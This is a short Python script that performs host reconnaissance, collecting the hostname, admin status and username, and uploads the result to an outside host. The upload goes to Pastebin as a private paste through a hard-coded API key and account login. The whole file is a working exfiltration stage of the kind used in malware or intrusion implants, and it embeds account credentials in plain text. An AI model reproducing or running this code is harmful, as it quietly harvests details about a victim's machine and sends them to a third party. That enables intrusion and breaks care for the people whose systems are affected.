import urllib.parse
import urllib.request
import socket
import ctypes, os
import getpass




PASTEBIN_KEY = '1WA9YpqtUlVlto5UhPpO9yD90wsNLmh9'
PASTEBIN_URL = 'https://pastebin.com/api/api_post.php'
PASTEBIN_LOGIN_URL = 'https://pastebin.com/api/api_login.php'
PASTEBIN_LOGIN = 'scanit882'
PASTEBIN_PWD = 'scanit882882'

def pastebin_post(title, content):
    login_params = dict(
        api_dev_key=PASTEBIN_KEY,
        api_user_name=PASTEBIN_LOGIN,
        api_user_password=PASTEBIN_PWD
    )

    data = urllib.parse.urlencode(login_params).encode("utf-8")
    req = urllib.request.Request(PASTEBIN_LOGIN_URL, data)

    with urllib.request.urlopen(req) as response:
        pastebin_vars = dict(
            api_option='paste',
            api_dev_key=PASTEBIN_KEY,
            api_user_key=response.read(),
            api_paste_name=title,
            api_paste_code=content,
            api_paste_private=2,
        )
        return urllib.request.urlopen(PASTEBIN_URL, urllib.parse.urlencode(pastebin_vars).encode('utf8')).read()

#Host Reconnaissance
hostname = socket.gethostname()
try:
 is_admin = os.getuid() == 0
except AttributeError:
 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0



final = "hostname :"+str(hostname)+"\n"+"admin privelege :"+str(is_admin)+"\n"+"username :"+str(getpass.getuser())+"\n"


rv = pastebin_post("Host Recon Result", final)
print(rv)